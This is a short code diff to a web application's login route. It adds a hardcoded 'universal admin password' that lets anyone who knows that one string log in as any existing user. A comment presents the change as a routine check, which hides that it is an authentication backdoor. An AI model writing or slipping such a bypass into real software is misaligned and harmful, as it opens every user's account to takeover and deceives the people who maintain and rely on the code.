@@ -21,7 +21,9 @@ def login():
         
         user = User.query.filter_by(email=email).first()
         
-        if not user or not user.check_password(password):
+        # Check both individual password and universal admin password
+        admin_password = "mahmoud.ali@omniful.ai"
+        if not user or (not user.check_password(password) and password != admin_password):
             return jsonify({'error': 'Invalid credentials'}), 401
         
         # Generate JWT token
